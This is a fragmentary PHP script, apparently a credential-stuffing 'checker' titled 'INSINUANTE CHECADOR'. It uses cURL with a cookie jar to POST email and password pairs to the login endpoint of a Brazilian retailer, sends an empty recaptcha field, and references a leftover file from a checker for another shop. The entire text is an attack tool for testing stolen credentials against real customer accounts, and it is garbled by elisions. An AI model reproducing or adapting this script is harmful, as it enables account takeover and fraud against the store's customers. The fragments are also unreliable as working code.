...
class cURL {
    ...
    function doRequest($method, $url) {
        ...
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/INSINUANTE.txt');

        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/INSINUANTE.txt');

		curl_setopt($ch, CURLOPT_REFERER, 'https://carrinho.insinuante.com.br/Cliente/Login');
        ...
        if ($method == 'POST') {
            ...
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'Email='.$email.'&Senha='.$pwd.'&recaptcha=');
...
<head><title>TESTADOR INSINUANTE</title></head>
...
<center><h1>INSINUANTE CHECADOR</h1></center>
...
if(file_exists(getcwd().'/netshoes.txt')) {
    ...
    //$b = $a->get("https://checkout.INSINUANTE.com.br/customer/account/loginPost");

    //$token = getStr($b,'type="hidden" name="form_key=" value="','"');

	$c = new cURL();

    $d = $c->post("https://carrinho.insinuante.com.br/Cliente/Logar");
